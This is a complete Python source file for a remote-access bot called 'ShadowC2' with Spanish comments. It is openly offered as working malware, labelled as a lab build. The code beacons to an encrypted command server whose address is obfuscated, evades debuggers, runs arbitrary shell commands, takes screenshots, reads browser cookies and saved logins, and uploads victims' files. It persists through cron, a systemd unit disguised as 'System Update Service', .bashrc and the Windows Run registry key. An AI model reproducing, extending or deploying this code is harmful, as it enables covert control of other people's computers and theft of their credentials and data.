#!/usr/bin/env python3
"""
ShadowC2 Bot - Modo HYBRID (Stealth + Clear)
Combinacion de lo mejor de ambos mundos:
- Encriptacion compatible 100% con crypto.py del servidor
- Heartbeat para mantener status "online"
- Reintentos de conexion con backoff
- Anti-analisis basico
- User-Agent rotativo
- Jitter aleatorio

Endpoints: /c2/stealth/... (encriptado)
"""

import base64
import json
import os
import platform
import random
import socket
import sqlite3
import subprocess
import sys
import time
import uuid
import zlib
from datetime import datetime
from pathlib import Path

import psutil
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from PIL import ImageGrab

# ============ CONFIGURACION ============
_C2_HOST = "bG9jYWxob3N0OjgwMDA="
_PASSPHRASE = "ShadowC2_Lab_2026_Secret_Key"
CHECK_INTERVAL = 10

# ============ CRYPTO (100% compatible con crypto.py del servidor) ============

def _d(s):
    return base64.b64decode(s).decode()

def _derive_key(passphrase, salt=None):
    if salt is None:
        salt = os.urandom(16)
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
    key = base64.urlsafe_b64encode(kdf.derive(passphrase.encode()))
    return key, salt

def _enc(data, passphrase=_PASSPHRASE):
    key, salt = _derive_key(passphrase)
    f = Fernet(key)
    encrypted = f.encrypt(data.encode())
    return base64.urlsafe_b64encode(salt + encrypted).decode()

def _dec(token, passphrase=_PASSPHRASE):
    try:
        decoded = base64.urlsafe_b64decode(token.encode())
        salt, encrypted = decoded[:16], decoded[16:]
        key, _ = _derive_key(passphrase, salt)
        f = Fernet(key)
        return f.decrypt(encrypted).decode()
    except Exception as e:
        return None

def _poly_encode(data):
    layers = ['base64', 'hex', 'rot13', 'reverse']
    random.shuffle(layers)
    result = data
    for layer in layers:
        if layer == 'base64':
            result = base64.b64encode(result.encode()).decode()
        elif layer == 'hex':
            result = result.encode().hex()
        elif layer == 'rot13':
            result = result.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
        elif layer == 'reverse':
            result = result[::-1]
    return base64.b64encode(f"{','.join(layers)}:{result}".encode()).decode()

def _poly_decode(data):
    try:
        decoded = base64.b64decode(data).decode()
        metadata, content = decoded.split(':', 1)
        layers = metadata.split(',')
        for layer in reversed(layers):
            if layer == 'base64':
                content = base64.b64decode(content).decode()
            elif layer == 'hex':
                content = bytes.fromhex(content).decode()
            elif layer == 'rot13':
                content = content.translate(str.maketrans(
                    'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm',
                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'))
            elif layer == 'reverse':
                content = content[::-1]
        return content
    except Exception as e:
        return None

def _compress_and_encrypt(data):
    compressed = zlib.compress(data.encode())
    return _enc(base64.b64encode(compressed).decode())

def _decrypt_and_decompress(data):
    decrypted = _dec(data)
    if decrypted:
        try:
            compressed = base64.b64decode(decrypted)
            return zlib.decompress(compressed).decode()
        except:
            return None
    return None

def _encrypt_command(command):
    """Igual que encrypt_command en crypto.py del servidor"""
    json_data = json.dumps(command)
    poly = _poly_encode(json_data)
    return _enc(poly)

def _decrypt_command(encrypted):
    """Igual que decrypt_command en crypto.py del servidor"""
    poly = _dec(encrypted)
    if poly:
        json_data = _poly_decode(poly)
        if json_data:
            try:
                return json.loads(json_data)
            except:
                return None
    return None

def _encrypt_response(data):
    """Igual que encrypt_response en crypto.py del servidor"""
    json_data = json.dumps(data)
    return _compress_and_encrypt(json_data)

def _decrypt_response(encrypted):
    """Igual que decrypt_response en crypto.py del servidor"""
    json_data = _decrypt_and_decompress(encrypted)
    if json_data:
        try:
            return json.loads(json_data)
        except:
            return None
    return None

# ============ BOT HYBRID ============

class BotHybrid:
    def __init__(self):
        self.bot_id = "".join(random.choices("abcdef0123456789", k=8))
        self.hostname = socket.gethostname()
        self.username = os.getlogin() if hasattr(os, 'getlogin') else 'unknown'
        self.os_info = f"{platform.system()} {platform.release()}"
        self.c2_url = f"http://{_d(_C2_HOST)}"
        self.session = requests.Session()
        self.keylogger_active = False
        self.keylog_buffer = []
        self.registered = False
        self._anti_analysis()
    
    def _anti_analysis(self):
        time.sleep(random.uniform(2, 5))
        if sys.gettrace() is not None:
            sys.exit(0)
        try:
            with open('/proc/cpuinfo', 'r') as f:
                if 'hypervisor' in f.read().lower():
                    pass
        except:
            pass
    
    def _random_ua(self):
        uas = [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
        ]
        return random.choice(uas)
    
    def _post(self, endpoint, data):
        try:
            encrypted = _compress_and_encrypt(data)
            r = self.session.post(
                f"{self.c2_url}{endpoint}",
                json={"data": encrypted},
                timeout=random.uniform(8, 15),
                headers={
                    "User-Agent": self._random_ua(),
                    "Accept": "application/json",
                    "Content-Type": "application/json"
                }
            )
            if r.status_code == 200:
                resp_data = r.json().get("data")
                if resp_data:
                    return _decrypt_and_decompress(resp_data)
            return None
        except Exception as e:
            return None
    
    def _get(self, endpoint):
        try:
            r = self.session.get(
                f"{self.c2_url}{endpoint}",
                timeout=random.uniform(8, 15),
                headers={
                    "User-Agent": self._random_ua(),
                    "Accept": "application/json"
                }
            )
            if r.status_code == 200:
                resp_data = r.json().get("data")
                if resp_data:
                    return _decrypt_and_decompress(resp_data)
            return None
        except Exception as e:
            return None
    
    def register(self):
        data = json.dumps({
            "bot_id": self.bot_id,
            "hostname": self.hostname,
            "username": self.username,
            "os": self.os_info,
            "capabilities": ["shell", "screenshot", "keylog", "download", "upload",
                           "persist", "info", "cookies", "passwords", "processes"]
        })
        result = self._post(f"/c2/stealth/register", data)
        if result:
            parsed = json.loads(result)
            self.bot_id = parsed.get("bot_id", self.bot_id)
            self.registered = True
            print(f"[+] Registrado (STEALTH) como {self.bot_id}")
            return True
        return False
    
    def heartbeat(self):
        """NUEVO: Mantiene el bot como 'online' en el panel"""
        try:
            data = json.dumps({"bot_id": self.bot_id})
            self._post(f"/c2/stealth/heartbeat/{self.bot_id}", data)
        except:
            pass
    
    def check_commands(self):
        result = self._get(f"/c2/stealth/check/{self.bot_id}")
        if result:
            parsed = json.loads(result)
            commands = []
            for enc_cmd in parsed.get("commands", []):
                cmd = _decrypt_command(enc_cmd)
                if cmd:
                    commands.append(cmd)
            return commands
        return []
    
    def send_result(self, cmd_id, result):
        data = json.dumps({"cmd_id": cmd_id, "result": result})
        self._post(f"/c2/stealth/result/{self.bot_id}", data)
    
    # ============ CAPACIDADES ============
    
    def execute_shell(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True,
                                  text=True, timeout=30)
            return {"stdout": result.stdout, "stderr": result.stderr,
                   "returncode": result.returncode}
        except Exception as e:
            return {"error": str(e)}
    
    def take_screenshot(self):
        try:
            import io
            screenshot = ImageGrab.grab()
            buf = io.BytesIO()
            screenshot.save(buf, format='PNG')
            img_data = base64.b64encode(buf.getvalue()).decode()
            
            data = json.dumps({"image_data": img_data})
            self._post(f"/c2/stealth/screenshot/{self.bot_id}", data)
            return {"status": "screenshot enviado"}
        except Exception as e:
            return {"error": str(e)}
    
    def get_system_info(self):
        return {
            "cpu_count": os.cpu_count(),
            "memory_total": psutil.virtual_memory().total,
            "memory_used": psutil.virtual_memory().used,
            "disk_usage": dict(psutil.disk_usage('/')._asdict()),
            "cwd": os.getcwd(),
            "pid": os.getpid(),
            "network_interfaces": psutil.net_if_addrs(),
            "boot_time": psutil.boot_time(),
            "users": [u._asdict() for u in psutil.users()]
        }
    
    def get_processes(self):
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
            try:
                processes.append(proc.info)
            except:
                pass
        return {"processes": processes[:100]}
    
    def download_file(self, filepath):
        try:
            if not os.path.exists(filepath):
                return {"error": "Archivo no encontrado"}
            
            filename = os.path.basename(filepath)
            with open(filepath, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            data = json.dumps({
                "filename": filename,
                "original_path": filepath,
                "file_data": file_data
            })
            self._post(f"/c2/stealth/file/{self.bot_id}", data)
            return {"status": "archivo subido", "filename": filename}
        except Exception as e:
            return {"error": str(e)}
    
    def establish_persistence(self):
        try:
            system = platform.system()
            methods = []
            
            if system == "Linux":
                try:
                    cron = f"(crontab -l 2>/dev/null; echo '@reboot python3 {os.path.abspath(__file__)}') | crontab -"
                    subprocess.run(cron, shell=True, check=False)
                    methods.append("cron")
                except:
                    pass
                
                try:
                    systemd_dir = Path.home() / ".config" / "systemd" / "user"
                    systemd_dir.mkdir(parents=True, exist_ok=True)
                    service_content = f"""[Unit]
Description=System Update Service
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
Restart=always
[Install]
WantedBy=default.target
"""
                    (systemd_dir / "update.service").write_text(service_content)
                    subprocess.run("systemctl --user daemon-reload", shell=True, check=False)
                    subprocess.run("systemctl --user enable update.service", shell=True, check=False)
                    methods.append("systemd")
                except:
                    pass
                
                try:
                    bashrc = Path.home() / ".bashrc"
                    with open(bashrc, 'a') as f:
                        f.write(f"\npython3 {os.path.abspath(__file__)} &>/dev/null &\n")
                    methods.append("bashrc")
                except:
                    pass
                
                return {"method": "multi", "status": "persistencia establecida", "methods": methods}
            
            elif system == "Windows":
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                   r"Software\Microsoft\Windows\CurrentVersion\Run",
                                   0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "ShadowUpdate", 0, winreg.REG_SZ,
                                sys.executable + " " + os.path.abspath(__file__))
                winreg.CloseKey(key)
                return {"method": "registry", "status": "persistencia establecida"}
            
            return {"error": "OS no soportado"}
        except Exception as e:
            return {"error": str(e)}
    
    def extract_cookies(self):
        cookies = {}
        home = Path.home()
        
        chrome_paths = [
            home / ".config" / "google-chrome" / "Default" / "Cookies",
            home / ".config" / "chromium" / "Default" / "Cookies",
            home / ".config" / "BraveSoftware" / "Brave-Browser" / "Default" / "Cookies",
        ]
        
        for path in chrome_paths:
            if path.exists():
                try:
                    conn = sqlite3.connect(str(path))
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value, path FROM cookies")
                    browser_name = path.parts[-3]
                    cookies[browser_name] = [
                        {"host": row[0], "name": row[1], "value": row[2][:50], "path": row[3]}
                        for row in cursor.fetchall()[:20]
                    ]
                    conn.close()
                except Exception as e:
                    cookies[str(path)] = f"Error: {e}"
        
        firefox_path = home / ".mozilla" / "firefox"
        if firefox_path.exists():
            for profile in firefox_path.iterdir():
                if profile.is_dir() and profile.name.endswith(".default"):
                    cookies_file = profile / "cookies.sqlite"
                    if cookies_file.exists():
                        try:
                            conn = sqlite3.connect(str(cookies_file))
                            cursor = conn.cursor()
                            cursor.execute("SELECT host, name, value, path FROM moz_cookies")
                            cookies["firefox"] = [
                                {"host": row[0], "name": row[1], "value": row[2][:50], "path": row[3]}
                                for row in cursor.fetchall()[:20]
                            ]
                            conn.close()
                        except Exception as e:
                            cookies["firefox"] = f"Error: {e}"
        
        return {"cookies_found": len(cookies), "browsers": cookies}
    
    def extract_passwords(self):
        passwords = {}
        home = Path.home()
        
        chrome_login_paths = [
            home / ".config" / "google-chrome" / "Default" / "Login Data",
            home / ".config" / "chromium" / "Default" / "Login Data",
        ]
        
        for path in chrome_login_paths:
            if path.exists():
                try:
                    conn = sqlite3.connect(str(path))
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    browser_name = path.parts[-3]
                    passwords[browser_name] = [
                        {"url": row[0], "username": row[1], "password": "[ENCRYPTED]"}
                        for row in cursor.fetchall()[:10]
                    ]
                    conn.close()
                except Exception as e:
                    passwords[str(path)] = f"Error: {e}"
        
        firefox_path = home / ".mozilla" / "firefox"
        if firefox_path.exists():
            for profile in firefox_path.iterdir():
                if profile.is_dir() and profile.name.endswith(".default"):
                    logins_file = profile / "logins.json"
                    if logins_file.exists():
                        try:
                            data = json.loads(logins_file.read_text())
                            passwords["firefox"] = [
                                {"url": login.get("hostname", ""),
                                 "username": login.get("encryptedUsername", "")[:30]}
                                for login in data.get("logins", [])[:10]
                            ]
                        except Exception as e:
                            passwords["firefox"] = f"Error: {e}"
        
        return {"passwords_found": sum(len(v) for v in passwords.values() if isinstance(v, list)),
                "browsers": passwords}
    
    # ============ MAIN LOOP ============
    
    def run(self):
        print(f"[*] ShadowC2 Hybrid Bot iniciando...")
        print(f"[*] C2 Target: {self.c2_url}")
        
        # Registro con reintentos
        registered = False
        retry_count = 0
        max_retries = 5
        
        while not registered and retry_count < max_retries:
            registered = self.register()
            if not registered:
                retry_count += 1
                wait_time = min(10 * retry_count, 60)
                print(f"[-] Intento {retry_count}/{max_retries} fallido. Reintentando en {wait_time}s...")
                time.sleep(wait_time)
        
        if not registered:
            print("[-] Maximos reintentos alcanzados. Saliendo.")
            return
        
        print(f"[+] Bot {self.bot_id} conectado. Entrando al loop principal...")
        
        while True:
            try:
                # Heartbeat para mantener "online"
                self.heartbeat()
                
                # Check commands
                commands = self.check_commands()
                
                for cmd in commands:
                    command = cmd.get("command")
                    args = cmd.get("args")
                    cmd_id = cmd.get("cmd_id")
                    
                    print(f"[*] Ejecutando: {command} {args}")
                    
                    if command == "shell":
                        result = self.execute_shell(" ".join(args) if args else "whoami")
                    elif command == "screenshot":
                        result = self.take_screenshot()
                    elif command == "info":
                        result = self.get_system_info()
                    elif command == "processes":
                        result = self.get_processes()
                    elif command == "download":
                        result = self.download_file(args[0] if args else "/etc/passwd")
                    elif command == "persist":
                        result = self.establish_persistence()
                    elif command == "cookies":
                        result = self.extract_cookies()
                    elif command == "passwords":
                        result = self.extract_passwords()
                    elif command == "keylog_start":
                        self.keylogger_active = True
                        result = {"status": "keylogger iniciado"}
                    elif command == "keylog_stop":
                        self.keylogger_active = False
                        result = {"status": "keylogger detenido", "buffer": self.keylog_buffer}
                        self.keylog_buffer = []
                    elif command == "kill":
                        self.send_result(cmd_id, {"status": "killed"})
                        sys.exit(0)
                    else:
                        result = {"error": "Comando desconocido"}
                    
                    self.send_result(cmd_id, result)
                
                time.sleep(random.uniform(8, 15))
                
            except KeyboardInterrupt:
                print("\n[!] Bot detenido por usuario")
                break
            except Exception as e:
                print(f"[!] Error en loop: {e}")
                time.sleep(random.uniform(8, 15))

if __name__ == "__main__":
    bot = BotHybrid()
    bot.run()
